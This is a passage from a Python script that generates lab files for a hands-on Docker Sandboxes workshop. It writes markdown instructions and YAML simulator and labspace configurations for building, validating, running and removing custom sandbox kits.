sbx run cursor . --kit ../customize/kit/workshop-app-nextjs --name lab5-kit
```

Wait ~1 minute for bootstrap on first run.
""",
        ),
        (
            "02-allowed.md",
            """
# Allowed research

Ask the agent:

> Research Kristiyan Velkov — read kristiyanvelkov.com for bio and books, check leanpub.com for publications. Summarize what you find.
""",
        ),
        (
            "03-denied.md",
            """
# Denied sites

Ask the agent:

> Search Google for Kristiyan Velkov and fetch LinkedIn profile info. Report what worked and what failed.

```bash terminal-id=host
sbx policy log lab5-kit --limit 15
```
""",
        ),
        (
            "04-inspect.md",
            """
# Inspect kit

Ask the agent:

> What did the workshop-app-nextjs kit add to this workspace? List `.cursor/rules/` and `.claude/skills/` files. Summarize `network.allowedDomains` and `commands.startup` from the kit spec.yaml.

```bash terminal-id=host
sbx exec lab5-kit -- curl -s -o /dev/null -w '%{http_code}\\n' http://127.0.0.1:3000
```

Expected: `200`
""",
        ),
        (
            "05-cleanup.md",
            """
# Clean up

```bash terminal-id=host
sbx rm lab5-kit --force
```

→ [Kits docs](https://docs.docker.com/ai/sandboxes/customize/kits/)
""",
        ),
    ]:
        write(base / name, content)


def lab06() -> None:
    base = LABS / "lab-06-customize-stack"
    write(
        base / "labspace.yaml",
        """
title: "Lab 6 — Build Your Custom Kit"
description: "Copy the kit template, customize spec.yaml and skills, validate, and run your own mixin kit."

catalog:
  icon: construction
  tags: ["kit", "customize", "final lab"]
  estimatedMinutes: 25
  order: 6

simulator: simulator.yaml

terminals:
  - id: host
    title: Host
    icon: dns

sections:
  - title: Introduction
    contentPath: 00-intro.md
  - title: Copy template
    contentPath: 01-copy.md
    steps:
      - id: copy-template
        title: "Copy kit-template to my-workshop-kit"
  - title: Customize spec
    contentPath: 02-spec.md
    steps:
      - id: edit-spec
        title: "Edit spec.yaml"
  - title: Validate
    contentPath: 03-validate.md
    steps:
      - id: kit-validate
        title: "sbx kit validate passes"
  - title: Run your kit
    contentPath: 04-run.md
    steps:
      - id: kit-run
        title: "Start sandbox with custom kit"
  - title: Clean up
    contentPath: 05-cleanup.md
    steps:
      - id: cleanup
        title: "Remove sandbox"
""",
    )
    write(
        base / "simulator.yaml",
        """
version: "2.0"

metadata:
  id: lab-06-customize-stack
  title: "Lab 6 — Custom Kit"
  summary: "Build and run your own mixin kit."

state:
  templateCopied: false
  specEdited: false
  validated: false
  kitRunning: false

defaults:
  unmatched:
    stderr: ["Error: that command isn't part of this lab yet."]
    exit: 1

scenarios:
  - id: copy-template
    completes: copy-template
    when:
      command: [cp]
      args:
        r:
          oneOf:
            - "lab-06-customize-stack/kit-template"
            - "./lab-06-customize-stack/kit-template"
            - "lab-06-customize-stack/kit-template/"
        0:
          oneOf: ["my-workshop-kit", "./my-workshop-kit"]
    then:
      state: { templateCopied: true }
      output:
        - "Copied lab-06-customize-stack/kit-template/ → my-workshop-kit/"
        - "Contents: spec.yaml, files/home/, files/workspace/"

  - id: kit-validate
    completes: kit-validate
    when:
      command: [sbx, kit, validate]
      promptContains: ["my-workshop-kit"]
      state: { templateCopied: true }
    then:
      state: { validated: true, specEdited: true }
      output:
        - "✓ schemaVersion"
        - "✓ kind: mixin"
        - "✓ permissions.network.allow"
        - "✓ setup.startup"
        - "Kit validation passed."

  - id: kit-inspect
    when:
      command: [sbx, kit, inspect]
      promptContains: ["my-workshop-kit"]
    then:
      output:
        - "name: my-workshop-kit"
        - "permissions.network.allow: [registry.npmjs.org, …]"
        - "setup.startup: workshop-bootstrap.sh"

  - id: kit-run-lab6
    completes: kit-run
    when:
      command: [sbx, run, cursor, .]
      args:
        --kit: ../my-workshop-kit
        --name: lab6-my-kit
    then:
      state: { kitRunning: true }
      output:
        - "Applying custom kit: my-workshop-kit"
        - "Bootstrap: npm ci + dev server on :3000"
        - "Sandbox ready."

  - id: agent-skill
    when:
      agent: true
      promptContains: ["SKILL.md", "kit rules"]
    then:
      output:
        - "Read .claude/skills/my-workshop-kit/SKILL.md"
        - "Your kit rules: team conventions, allowed domains, bootstrap behavior."

  - id: sbx-rm-lab6
    completes: cleanup
    when:
      command: [sbx, rm, lab6-my-kit]
      args:
        --force: { any: true }
    then:
      state: { kitRunning: false }
      output: ["lab6-my-kit removed"]
""",
    )
    for name, content in [
        (
            "00-intro.md",
            """
# Lab 6 — Build Your Custom Kit

Final lab — create your own **mixin kit** from the template in `kit-template/`. Use the [playground clone](https://github.com/kristiyan-velkov/docker-sandbox-workshop) from Lab 4.

Never edit `kit-template/` in place — copy it first:

```bash
cp -r kit-template ./my-workshop-kit
```
""",
        ),
        (
            "01-copy.md",
            """
# Copy template

```bash terminal-id=host
cp -r kit-template ./my-workshop-kit
ls my-workshop-kit/
```
""",
        ),
        (
            "02-spec.md",
            """
# Customize spec.yaml

Edit `my-workshop-kit/spec.yaml`:

| Block | What to set |
|-------|-------------|
| `name` / `displayName` | Your kit id |
| `permissions.network.allow` | Domains your team needs |
| `permissions.network.deny` | Domains to block |
| `files/workspace/` | Cursor rules, Claude skills |

Bootstrap script: `files/home/.local/bin/workshop-bootstrap.sh`
""",
        ),
        (
            "03-validate.md",
            """
# Validate

```bash terminal-id=host
sbx kit validate ./my-workshop-kit
sbx kit inspect ./my-workshop-kit
```

Fix every error before running.
""",
        ),
        (
            "04-run.md",
            """
# Run your kit

```bash terminal-id=host
cd docker-sandbox-workshop/workshop-app
cp .env.sandbox.example .env.local
sbx run cursor . --kit ../my-workshop-kit --name lab6-my-kit
```

Ask the agent:

> Read `.claude/skills/my-workshop-kit/SKILL.md` and summarize my kit rules.
""",
        ),
        (
            "05-cleanup.md",
            """
# Clean up

```bash terminal-id=host
sbx rm lab6-my-kit --force
```

Keep `./my-workshop-kit/` — reuse on any project with `--kit ../my-workshop-kit`.

→ [Kit reference](https://docs.docker.com/ai/sandboxes/customize/kit-reference/)
""",
        ),
    ]:
        write(base / name, content)


def labspace_docs() -> None:
    write(
        ROOT / "labspace.yaml",
        """
title: "Docker Sandboxes Workshop — Live Track"
description: |
  Hands-on Docker Sandboxes workshop with a real terminal. Run sbx commands on
  your machine while following step-by-step instructions — install, network policy,
  secrets, clone workflow, kits, and custom stack.

services:
  - title: Terminal
    id: term1
    url: http://localhost:8085
    icon: terminal

sections:
  - title: Welcome
    contentPath: .labspace/00-welcome.md
  - title: "Lab 1 — First Sandbox"
    contentPath: docs/lab-01-first-sandbox.md
  - title: "Lab 2 — Network Policy"
    contentPath: docs/lab-02-network-policy.md
  - title: "Lab 3 — Secrets"
    contentPath: docs/lab-03-secrets.md
  - title: "Lab 4 — Clone Workflow"
    contentPath: docs/lab-04-clone-workflow.md
  - title: "Lab 5 — Workshop App & Kit"
    contentPath: docs/lab-05-workshop-app.md
  - title: "Lab 6 — Custom Kit"
    contentPath: docs/lab-06-customize-stack.md
""",
    )
    write(
        ROOT / ".labspace/00-welcome.md",
        """
# Docker Sandboxes Workshop — Live Track

Welcome! This track runs **real `sbx` commands** on your machine in the terminal panel.

## Prerequisites

- [sbx CLI](https://docs.docker.com/ai/sandboxes/get-started/) installed
- [ttyd](https://github.com/tsl0922/ttyd): `brew install ttyd`
- Cursor API key stored: `sbx secret set cursor`

## Quick start

```bash
bash start-labspace.sh
```

Open **http://localhost:3030** — instructions on the left, your terminal on the right.

## Two tracks in this repo

| Track | How to run | Terminal |
|-------|------------|----------|
| **Self-paced (Simspace)** | `docker compose up dev` → http://localhost:5173 | Simulated in browser |
| **Live workshop (Labspace)** | `bash start-labspace.sh` → http://localhost:3030 | Real sbx on your Mac |

Work through labs 1–6 in order. Each lab maps to the original workshop GUIDE.
""",
    )
    write(
        ROOT / ".labspace/compose.override.yaml",
        """
services:
  labspace:
    environment:
      CONTENT_PATH: ${CONTENT_PATH:-.}
""",
    )
    # Live-track guides in docs/ are authored in place (official sbx 0.43.0
    # syntax, one command per fence). Do not overwrite them from workshop GUIDEs.


def main() -> None:
    # Simspace labs in labs/ are authored in place (one command per fence,
    # official sbx 0.43.0 syntax). Running the lab*() writers would overwrite
    # that work. Refresh only the Labspace manifest and welcome page.
    labspace_docs()
    print(f"Labspace manifest refreshed. Simspace labs are authored in {LABS}")
    print(f"Labspace docs are authored in {DOCS}")


if __name__ == "__main__":
    main()
